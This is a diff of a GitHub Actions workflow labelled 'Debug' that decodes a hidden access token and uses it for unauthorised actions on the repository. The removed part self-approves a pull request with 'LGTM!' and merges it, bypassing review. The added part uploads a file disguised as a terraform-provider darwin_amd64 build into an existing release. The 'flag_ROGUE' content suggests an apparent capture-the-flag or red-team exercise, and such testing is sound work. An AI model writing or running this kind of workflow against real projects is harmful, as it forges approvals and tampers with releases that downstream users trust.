@@ -2,10 +2,6 @@ name: Debug
 
 on:
   workflow_dispatch:
-
-env:
-  PR_NUMBER: 23
-  RELEASE_TAG_SHA: 4c622f390949baf5e33a9aa8be1606209815ba13
   
 jobs:
   debug:
@@ -19,13 +15,11 @@ jobs:
           decoded_token_with_prefix=$(echo $encoded_token | base64 --decode)
           export GITHUB_TOKEN=${decoded_token_with_prefix#x-access-token:}
 
-          gh api \
-            --method POST \
-            /repos/$GITHUB_REPOSITORY/pulls/$PR_NUMBER/reviews \
-            -f commit_id=$RELEASE_TAG_SHA \
-            -f body='LGTM!' \
-            -f event='APPROVE'
-            
-          gh api \
-            --method PUT \
-            /repos/$GITHUB_REPOSITORY/pulls/$PR_NUMBER/merge
+          EXISTING_RELEASE_ID=$(gh api /repos/$GITHUB_REPOSITORY/releases/tags/$TARGET_TAG | jq -r .id)
+          echo "flag_ROGUE" > $RUNNER_TEMP/flag.txt
+          curl -L \
+            -X POST \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            -H "Content-Type: application/octet-stream" \
+            "https://uploads.github.com/repos/$GITHUB_REPOSITORY/releases/$EXISTING_RELEASE_ID/assets?name=terraform-provider-scribble_0.0.8_darwin_amd64-flag.txt" \
+            --data-binary "@$RUNNER_TEMP/flag.txt"
